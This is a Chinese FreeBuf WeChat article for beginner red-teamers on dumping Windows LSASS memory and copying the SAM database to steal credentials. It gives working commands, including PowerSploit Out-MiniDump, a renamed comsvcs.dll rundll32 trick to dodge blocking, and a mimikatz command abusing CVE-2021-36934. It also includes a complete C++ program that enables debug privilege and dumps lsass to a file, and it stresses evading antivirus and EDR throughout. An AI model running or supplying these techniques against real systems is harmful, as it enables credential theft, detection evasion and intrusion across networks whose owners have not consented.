#  萌新玩转转存储之Lsass.exe&SAM

面包and牛奶  [ FreeBuf ](javascript:void\(0\);)

**FreeBuf** ![]()

微信号 freebuf

功能介绍 中国网络安全行业门户

____

___发表于_

收录于合集

## **  Lsass转存储与SAM拷贝技巧 **

  
古语云："势者，因利而制权也"，为了我们可以在攻防演练中拔得头筹，升职加薪，走上人生巅峰。内网信息收集就是绕不过的坎，其中尤以账号密码/哈希为最。  
得此讯息者，进则内网犹入无人之境，于域内七进七出；退则留为后手，救人于危难之间，一招定乾坤。所以，今天我打算收集素材作药，以靶场之火煅烧，求得灵丹妙药。以备攻防演练之不时之需。其中难免存在不足，望师傅斧正，已补不足。

>
> 为什么需要转存储？为了降低mimikatz上传后被杀软发现的风险！为啥需要转存储Lsass和SAM这两个？因为他们两都和账号密码，哈希值这些敏感信息密切相关！

##  

##  **  Lsass转存储技巧 **

###  

###  **技巧一：任务管理器直接转存储**

  
我们可以直接通过任务管理器直接对Lsass.exe的进程进行转存储操作，但是转存储的dump文件,会保存在一个固定的路径下面（保存路径地址：`C:\Users\用户名\AppData\Local\Temp`），由于使用要求过高这种方法并不常用。  
![]()

###  

###  **技巧二：PuDump转存储**

  
白文件是我们最常用的办法，但是它这个文件并不白，就算有了微软的签名认证，国内某个无良厂商，也会在运行的时候给予提示，导致我们的攻击失败，并且被防守方发觉。（下载链接：https://learn.microsoft.com/zh-
cn/sysinternals/downloads/procdump）  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195123.png)  
与之相对应的还有SQLDumper.exe；createdump.exe这两款工具，只要一旦运行起来了，某不良厂商，就会进行弹窗警告，导致有暴露的风险，所以，这两款工具都不推荐大家使用，或者阅读源码，了解攻击方法，进行二次创作。不过，虽然被查杀的很紧，但是由于这类工具操作方便，而且在复杂环境下的泛用性极强，所以下面这种方法就是吸收了，技巧二的精髓的延伸。  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195128.png)  
小提示：需要管理员权限！！！

###  

###  **技巧三：利用中断机制转存储**

  
由于上述方法都不太方便进行利用攻击，所以我们想到了利用Lsass.exe进程的退出/终止的阶段，对文本的内容进行一个转存储的一个dump操作，进而获取到我们想要的lsass.dmp文件。但是问题是Lsass.exe的进程属于操作系统层面的问题，所以我们就有两种ru解决的方法（方案二是我看见玉玉师傅的视频后才学习到的（代码：gitee.com/cutecuteyu/silent-
exit-read-lsass-memo），个人觉得更适用于攻防演练）：

>
> 方案一：利用"蓝屏"的攻击手段，导致Lsass.exe程序中断，然后对程序进行拷贝复制（dump操作）（但是，我们无法保证蓝屏后防守方不会发觉，并且进行应急响应，导致攻击失败）方案二：调用API函数，做到不kill进程，进行转存储操作（也有风险），但是可能需要修改目标主机注册表的键值，导致EDR平台的报警

  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195136.png)  
小提示：需要管理员提示，并且可以过火绒，但是转存储的地址是固定的（保存路径地址：）。  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195142.png)  
小提示：方案一的参考链接：文章1：https://www.deepinstinct.com/blog/lsass-memory-dumps-are-
stealthier-than-ever-before；  
文章2：https://borncity.com/win/2020/10/31/windows-10-20h2-abstrze-von-lsass-
exe/。

###  

###  **技巧四：利用PowerSploit加载转存储**

  
有.exe的方法，那肯定就有利用powershell加载的手段了。我们请出老朋友PowerSploit（GitHub项目的开源地址：下载链接）。我们利用PowerSploit
的Out-MiniDump模块，可以选择创建进程的完整内存转储。步骤如下所示：

    
          *   *   *   * 
    
    
    
    // 导入Import-Module Out-MiniDump//执行Get-Process lsass | Out-Minidump

  

  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195148.png)  
小提示：都是使用API的方法MiniDumpWriteDump；通过comsvcs.dll的导出函数MiniDump实现dump内存，与下面的方法不谋而和！

###  

###  **技巧五：系统自带comsvcs.dll转存储**

  
构造技巧：在dump指定进程内存文件时，需要开启SeDebugPrivilege权限。管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled禁用状态。  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195153.png)  
解决方案：因为管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为Enabled；所以可以通过powershell执行rundll32的命令实现。

> 首先查看lsass.exe进程PID:命令格式：`rundll32.exe comsvcs.dll MiniDump <lsass PID> <out
> path> full`直接利用发现会被拦截：`rundll32.exe C:\windows\System32\comsvcs.dll,
> MiniDump 564 lsass.dmp full`

  
绕过技巧：

    
          *   * 
    
    
    
    copy C:\windows\System32\comsvcs.dll 110.dllrundll32.exe 110.dll, MiniDump 508 lsass.dmp full

 _（向右滑动，查看更多）_

###  ****

###  

###  **技巧六：开源工具Lsassy转存储**

  
这个是GitHub上开源的一款工具，但是无法绕过免杀，一上就被杀。但是我们可以借鉴一下源码，可以通过Go语言编译修改特征码或者替换敏感函数...操作。达到一个比较好的一个免杀效果（GitHub项目的开源地址：https://github.com/Hackndo/lsassy）。  
而且Lsassy可以当做Python库，它可以搭配其他库，编写出python版本的Mimikatz。Lsassy不仅使用了impacket从Lsass.exe导出数据中远程读取所需的敏感内容，还使用了pypykatz来提取用户凭证（而且携带的内容丰富，包括上面介绍的一种方法）。  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195157.png)  
小提示：这个只适用于我们的域环境，毕竟批量操作是真的香啊！

###  

###  **技巧七：利用快照转存储**

    
    
      
    
    
      *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
     #include <windows.h>#include <DbgHelp.h>#include <iostream>#include <TlHelp32.h>  
    #pragma comment ( lib, "dbghelp.lib" )  
    using namespace std;  
    #define INFO_BUFFER_SIZE 32767  
    std::wstring s2ws(const std::string& s){int len;int slength = (int)s.length() + 1;len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);wchar_t* buf = new wchar_t[len];MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);std::wstring r(buf);delete[] buf;return r;}// 提升权限为 debugbool EnableDebugPrivilege(){HANDLE hToken;LUID sedebugnameValue;TOKEN_PRIVILEGES tkp;  
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){return   FALSE;}if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) //修改进程权限{CloseHandle(hToken);return false;}tkp.PrivilegeCount = 1;tkp.Privileges[0].Luid = sedebugnameValue;tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) //通知系统修改进程权限{CloseHandle(hToken);return false;}return true;}  
    int main() {char filename[INFO_BUFFER_SIZE];char infoBuf[INFO_BUFFER_SIZE];DWORD  bufCharCount = INFO_BUFFER_SIZE;GetComputerNameA(infoBuf, &bufCharCount);strcpy_s(filename, infoBuf);strcat_s(filename, "-");strcat_s(filename, "lsass.dmp");  
    DWORD lsassPID = 0;HANDLE lsassHandle = NULL;HANDLE outFile = CreateFileA(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);PROCESSENTRY32 processEntry = {};  // 拍摄快照时驻留在系统地址空间里的进程列表结构体processEntry.dwSize = sizeof(PROCESSENTRY32);   //结构大小LPCWSTR processName = L"";  //进程名  
    if (Process32First(snapshot, &processEntry)) {  //检索快照中第一个进程的信息while (_wcsicmp(processName, L"lsass.exe") != 0) {  //循环检索快照中的进程Process32Next(snapshot, &processEntry);processName = processEntry.szExeFile;   // 获取当前进程的进程名lsassPID = processEntry.th32ProcessID;}wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;}  
    if (EnableDebugPrivilege() == false){printf("enable %d", GetLastError());}EnableDebugPrivilege();lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID); // 根据 Pid 打开 lsass.exe 进程，获取句柄BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL); //转储lsass，写入outfile  
    if (isDumped) {cout << "[+] Save To " << filename << endl;cout << "[+] lsass dumped successfully!" << endl;}  
    return 0;}

 _（向右滑动，查看更多）_  
代码链接：https://www.t00ls.net/viewthread.php?tid=54000&extra=&page=1；  
但是需要账号！也可以在先知上其他师傅的文章，我这里就是一些步骤：

>
> 1.提升权限。因为lsass进程的权限为system权限，所以想要对其操作首先要提升自身进程权限为debug权限。2.对所有进程拍摄快照，然后循环检索lsass进程id3.将lsass内存的快照进行转储，并写入文件

##  

##  **  SAM拷贝技巧 **

###  

###  **技巧一：CVE-2021-36934获取SAM**

  
产生漏洞的原因是由于对多个系统文件（包括安全帐户管理器 (SAM) 数据库）的访问控制列表 (ACL)
过于宽松，因此存在特权提升漏洞，成功利用此漏洞可以将普通用户权限提升至SYSTEM权限并在目标机器上执行任意代码。该漏洞影响的范围是windows10
1809之后的版本；利用条件是开启VSS卷影复制服务（默认开启）。

    
          * 
    
    
    
    lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

 _（向右滑动，查看更多）_

  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195159.png)

###  

###  **技巧二：高权限直接转存储**

###  

###
SAM一般存储在`%SystemRoot%\system32\config\sam`中，我们需要高权限直接转存储。但是要求较高，一般攻击Lsass.exe,所以不常见！

  
![](https://gitee.com/fuli009/images/raw/master/public/20221009195206.png)

##  

##  **  小结 **

  
这些大概是比较全面的的技巧了，最核心的思想还是利用Lsass.exe进程的退出/终止的阶段，对文本的内容进行一个转存储的一个dump操作，进而获取到我们想要的lsass.dmp文件和找到SAM拷贝的权限，进而获取到它们的dump文件，最后利用Mimikatz分析。以后遇见其他思路我会补上，今天的学习就到这里了。  
 **参考链接：**
https://www.freebuf.com/vuls/329351.htmlhttps://www.freebuf.com/sectool/226170.htmlhttps://xz.aliyun.com/t/9725https://www.anquanke.com/post/id/252552![](https://gitee.com/fuli009/images/raw/master/public/20221009195211.png)  
  

精彩推荐

  
  
  
  
  
 ** ******  
  
[![](https://gitee.com/fuli009/images/raw/master/public/20221009195221.png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247489274&idx=1&sn=253d4f55931e09104da3149793a79541&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20221009195245.png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247489179&idx=1&sn=cec2150b339afcf1fb7a11a3a1c0331c&scene=21#wechat_redirect)[![](https://gitee.com/fuli009/images/raw/master/public/20221009195247.png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247489160&idx=1&sn=b08a52dcf6b99d10feac771004971aff&scene=21#wechat_redirect)![](https://gitee.com/fuli009/images/raw/master/public/20221009195250.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

